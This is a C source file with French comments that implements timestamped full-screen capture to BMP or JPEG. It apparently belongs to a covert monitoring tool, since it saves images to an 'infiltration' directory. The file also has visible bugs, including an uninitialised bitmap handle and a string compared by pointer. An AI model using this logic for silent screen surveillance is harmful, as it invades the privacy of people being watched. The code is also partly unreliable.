//=============================================================================
// Projet : WinSk
// Fichier : capture.c
//
//=============================================================================

#include "resources.h"


//=============================================================================
//                               Constantes
//=============================================================================

#define SAVE_DIRECTORY      "Captures"


//=============================================================================
//                        Fonction de capture d'écran
//=============================================================================

BOOL capturerEcran(char *fileName, UINT width, UINT height, UINT CompressionQuality, BOOL saveToBmp)
{
   /* Récupération de la date actuelle */
   SYSTEMTIME Time;
   GetSystemTime(&Time);
   
   if (!TEST_VERSION) // si ce n'est pas la version de test
   {
      /* Création du dossier de sauvegarde, s'il existe ça ne changera rien */
      sprintf(fileName, "%s\\%s", Parametres.RepertoireInfiltration, SAVE_DIRECTORY);
      CreateDirectory(fileName, NULL);
   
      /* Emplacement+nom de la capture */
      sprintf(fileName, "%s\\%s\\%02d-%02d-%d - %02dh%02dm%02ds%02dms.%s", Parametres.RepertoireInfiltration, SAVE_DIRECTORY, Time.wDay
                       , Time.wMonth, Time.wYear, Time.wHour, Time.wMinute, Time.wSecond, Time.wMilliseconds, saveToBmp ? "bmp" : "jpg");
   }
   else
      sprintf(fileName, "%s\\%02d-%02d-%d - %02dh%02dm%02ds%02dms.%s", Parametres.RepertoireInfiltration, Time.wDay
                       , Time.wMonth, Time.wYear, Time.wHour, Time.wMinute, Time.wSecond, Time.wMilliseconds, saveToBmp ? "bmp" : "jpg");
   
   /* Déclaration des variables */
   HDC              hdcMem;
   HDC              hdcScr;
   HBITMAP          hbmMem;
   HBITMAP          hbmOld;
   HANDLE           hFile; // handle du fichier bitmap (ne sera pas utilisé si saveToBmp == FALSE)
   BITMAPINFO       bmi;
   BITMAPFILEHEADER bfh;  
   BITMAPINFOHEADER bmih;
   LPBYTE           pPixels;
   DWORD            dwTmp;
   UINT             nScrX = GetSystemMetrics(SM_CXSCREEN);
   UINT             nScrY = GetSystemMetrics(SM_CYSCREEN);  
 
   hdcScr = GetDC(NULL);
   if (saveToBmp)
      hbmMem = CreateCompatibleBitmap(hdcScr, nScrX, nScrY);
   hdcMem = CreateCompatibleDC(hdcScr);
   hbmOld = (HBITMAP) SelectObject(hdcMem, hbmMem);
 
   if(saveToBmp && !StretchBlt(hdcMem, 0, 0, width, height, hdcScr, 0, 0, nScrX, nScrY, SRCCOPY)) // si c'est une image bmp == on doit utiliser la taille demandée (width, height)
      goto Erreur;

   bmih.biSize          = sizeof(BITMAPINFOHEADER);
   if (saveToBmp) // si saveToBmp == TRUE On doit utiliser la taille d'image demandée
   {
      bmih.biWidth      = width;  //255;
      bmih.biHeight     = height; //191;
      bmih.biBitCount   = GetDeviceCaps(hdcMem, BITSPIXEL);
   }
   else
   {
      bmih.biWidth      = nScrX; //width;  //255;
      bmih.biHeight     = nScrY; //height; //191;
      bmih.biBitCount   = 24; //GetDeviceCaps(hdcMem, BITSPIXEL);
   }
   bmih.biCompression   = BI_RGB;
   bmih.biPlanes        = 1;  
   bmih.biSizeImage     = 0;
   bmih.biXPelsPerMeter = 0;
   bmih.biYPelsPerMeter = 0;
   bmih.biClrUsed       = 0;
   bmih.biClrImportant  = 0;
   
   bmi.bmiHeader        = bmih;

   if(!(pPixels = (LPBYTE) GlobalAlloc(GMEM_FIXED, bmih.biWidth * bmih.biHeight * (bmih.biBitCount / 8))))
      goto Erreur;
      
   if (saveToBmp) // on enregistre sous le format bitmap (pas de compression possible)
   {
      if(!GetDIBits(hdcMem, hbmMem, 0, (WORD) bmih.biHeight, pPixels, &bmi, DIB_RGB_COLORS))
         goto Erreur;
      
      bfh.bfType      = 0x4d42;
      bfh.bfReserved1 = 0;
      bfh.bfReserved2 = 0; 
      bfh.bfOffBits   = (DWORD) sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);   
      bfh.bfSize      = (DWORD) sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bmih.biWidth * bmih.biHeight * (bmih.biBitCount / 8);
 
      hFile = CreateFile(fileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
      if(hFile == INVALID_HANDLE_VALUE) 
         goto Erreur;
 
      if(!WriteFile(hFile, (LPVOID) &bfh, sizeof(BITMAPFILEHEADER), (LPDWORD) &dwTmp, NULL))
         goto Erreur;
 
      if(!WriteFile(hFile, (LPVOID) &bmih, sizeof(BITMAPINFOHEADER), (LPDWORD) &dwTmp, NULL))
         goto Erreur;
 
      if(!WriteFile(hFile, (LPVOID) pPixels, bmih.biWidth * bmih.biHeight * (bmih.biBitCount / 8), (LPDWORD) &dwTmp, NULL))
         goto Erreur;
         
      CloseHandle(hFile);
   }
   else // on compresse + enregistre sous le format Jpeg
   {
      if ((hbmMem = CreateDIBSection(0, &bmi, DIB_RGB_COLORS, (LPVOID)&pPixels, 0, 0)) != 0)
      { 
         if (SelectObject(hdcMem, hbmMem) != 0)
        {
            if (BitBlt(hdcMem, 0, 0, nScrX, nScrY, hdcScr, 0, 0, SRCCOPY))
               JpegFromDib(pPixels, &bmih, CompressionQuality, fileName);
         }
      }
      
      DeleteObject(hbmMem);
   }
   
   // On vide la mémoire
   GlobalFree(pPixels);
   SelectObject(hdcMem, hbmOld);
   ReleaseDC(NULL, hdcScr);
   DeleteDC(hdcMem);
   return TRUE;

   /* Etiquette Erreur (sera appelé uniquement à l'aide de goto) */
   Erreur:
   if(pPixels) 
      GlobalFree(pPixels);  
   if(saveToBmp && hFile)
   { 
      CloseHandle(hFile);
      DeleteFile(fileName);
   }    
   SelectObject(hdcMem, hbmOld);
   ReleaseDC(NULL, hdcScr);
   DeleteDC(hdcMem); 
   return FALSE;      
}

//=============================================================================
//           Fonctions de conversion direct du hdc/BMP en jpeg
//=============================================================================

BOOL FillJpegBuffer(LPBYTE pBits, LPBITMAPINFOHEADER pbmih, int nSampsPerRow, JSAMPARRAY jsmpPixels)
{
   if (pBits == NULL || nSampsPerRow <= 0) return 0;
   
   int r=0, p=0, q=0, nUnused=0, nBytesWide=0, nRow=0, nPixel=0;

   nBytesWide =  (pbmih->biWidth*3);
   nUnused    =  (((nBytesWide + 3) / 4) * 4) - nBytesWide;
   nBytesWide += nUnused;

   for (r=0; r<pbmih->biHeight; r++)
   {
      for (p=0, q=0; p<(nBytesWide-nUnused); p+=3, q+=3)
      { 
         nRow = (pbmih->biHeight-r-1) * nBytesWide;
         nPixel  = nRow + p;

         jsmpPixels[r][q+0] = pBits[nPixel+2]; /* Red */
         jsmpPixels[r][q+1] = pBits[nPixel+1]; /* Green */
         jsmpPixels[r][q+2] = pBits[nPixel+0]; /* Blue */
      }
   }
   return TRUE;
}

BOOL JpegFromDib(LPBYTE pBits, LPBITMAPINFOHEADER pbmih, int nQuality, char *pathJpeg)             
{
    if (nQuality < 0 || nQuality > 100 || pBits   == NULL || pathJpeg == "") return 0;
    
    /* Utilisation de la libjpeg(.a) pour écrire les scanlines sur le disque */
    struct jpeg_compress_struct cinfo;
    struct jpeg_error_mgr       jerr;
    
    FILE*      pOutFile;     /* Fichier cible/de sortie */
    int        nSampsPerRow; /* Longueur d'une ligne dans le buffer */
    JSAMPARRAY jsmpArray;    /* Buffer des pixels RGB pour le fichier jpeg */
    
    cinfo.err = jpeg_std_error(&jerr); /* Utilisation du default error handling */

    jpeg_create_compress(&cinfo);

    if ((pOutFile = fopen(pathJpeg, "wb")) == NULL) /* Lecture/écriture binaire */
    {
       jpeg_destroy_compress(&cinfo);
       return FALSE;
    }
    
    jpeg_stdio_dest(&cinfo, pOutFile);
    cinfo.image_width      = pbmih->biWidth;  /* Largeur et hauteur de l'image en pixels */
    cinfo.image_height     = pbmih->biHeight;
    cinfo.input_components = 3;              /* Composants couleur par pixel */                                     
    cinfo.in_color_space   = JCS_RGB; 	     /* Colorspace of input image */
    jpeg_set_defaults(&cinfo);               /* Paramétres par défaut dans cinfo */
    jpeg_set_quality(&cinfo, nQuality, 1);    
    jpeg_start_compress(&cinfo, TRUE);
    nSampsPerRow = cinfo.image_width * cinfo.input_components;
    jsmpArray = (*cinfo.mem->alloc_sarray)((j_common_ptr) &cinfo, JPOOL_IMAGE, nSampsPerRow, cinfo.image_height);
                 
    if (FillJpegBuffer(pBits, pbmih, nSampsPerRow, jsmpArray))
       jpeg_write_scanlines(&cinfo, jsmpArray, cinfo.image_height);
    
    jpeg_finish_compress(&cinfo);
    fclose(pOutFile);
    jpeg_destroy_compress(&cinfo);

    return TRUE;
}
